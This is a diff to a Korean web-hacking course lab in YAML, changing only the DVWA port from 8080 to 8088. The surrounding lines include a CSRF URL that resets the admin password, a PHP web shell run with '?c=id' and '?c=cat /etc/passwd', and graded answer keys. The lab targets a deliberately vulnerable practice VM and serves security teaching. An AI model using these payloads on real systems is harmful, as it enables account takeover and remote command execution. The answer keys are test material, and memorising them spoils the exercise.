@@ -6,12 +6,12 @@ description: |
   웹의 작동 원리를 개발자도구로 직접 본 뒤, 연습용 표적 DVWA에서 5대 웹 해킹을 내 손으로
   성공시킨다. 모든 페이로드(넣을 글자)와 '화면에 보여야 할 것'을 정확히 적어 두었으니 그대로만
   따라하면 변수 없이 똑같은 결과가 나온다. 표적 DVWA는 반드시 Security=Low 로 둔다.
-  공격은 학생 브라우저(공격자 VM)에서, 표적은 희생자 VM의 DVWA(:8080)다.
+  공격은 학생 브라우저(공격자 VM)에서, 표적은 희생자 VM의 DVWA(:8088)다.
 difficulty: medium
 duration_minutes: 300
 prerequisites:
   - "Week 02 통과(터미널/파일 다루기), 해킹 서약 유효"
-  - "희생자 VM에서 ./start.sh 로 DVWA 기동, http://<victim-ip>:8080 접속 가능"
+  - "희생자 VM에서 ./start.sh 로 DVWA 기동, http://<victim-ip>:8088 접속 가능"
   - "DVWA: admin/password 로그인 → Create/Reset Database → Security=Low 설정 완료"
 objectives:
   - "개발자도구로 쿠키/요청을 관찰한다"
@@ -150,7 +150,7 @@ steps:
       1. 좌측 **CSRF** 클릭(현재 admin 으로 로그인된 상태).
       2. 브라우저 주소창에 아래 주소를 직접 입력해 접속(<victim-ip> 는 실제 IP):
          ```
-         http://<victim-ip>:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
+         http://<victim-ip>:8088/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
          ```
       3. 화면에 "Password Changed" 가 뜬다 → 비번이 hacked123 으로 바뀜.
       ## ✅ 합격 기준
@@ -163,7 +163,7 @@ steps:
     category: csrf
     points: 14
     answer: |
-      http://<victim-ip>:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
+      http://<victim-ip>:8088/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change#
       → "Password Changed"
     answer_detail: "DVWA Low의 CSRF는 토큰 검증이 없어, 로그인 세션만 있으면 GET 요청만으로 비번이 바뀐다. 'Password Changed'가 뜨고 새 비번으로 로그인되면 성공. 클릭 한 번의 위험을 체감하는 단계."
     verify:
@@ -186,7 +186,7 @@ steps:
          업로드 성공 시 저장 경로가 표시된다(보통 ../../hackable/uploads/shell.php).
       3. 브라우저로 웹셸에 명령을 보낸다:
          ```
-         http://<victim-ip>:8080/hackable/uploads/shell.php?c=id
+         http://<victim-ip>:8088/hackable/uploads/shell.php?c=id
          ```
          → 화면에 `uid=33(www-data) ...` 가 출력(서버에서 명령 실행됨).
       4. 한 번 더: `...shell.php?c=cat /etc/passwd` → 서버 계정 목록이 보인다.
@@ -200,7 +200,7 @@ steps:
     category: upload
     points: 25
     answer: |
-      shell.php 업로드 → http://<victim-ip>:8080/hackable/uploads/shell.php?c=id
+      shell.php 업로드 → http://<victim-ip>:8088/hackable/uploads/shell.php?c=id
       → uid=33(www-data) gid=33(www-data) ...
     answer_detail: "DVWA Low는 업로드 파일의 확장자/내용을 검증하지 않아 PHP 웹셸이 그대로 실행된다. ?c=id 결과로 uid=가 보이면 원격 명령 실행(RCE) 성공 — 서버 장악을 의미하는 최고 강도의 시연이다. ?c=cat /etc/passwd 로 확장 확인."
     verify:
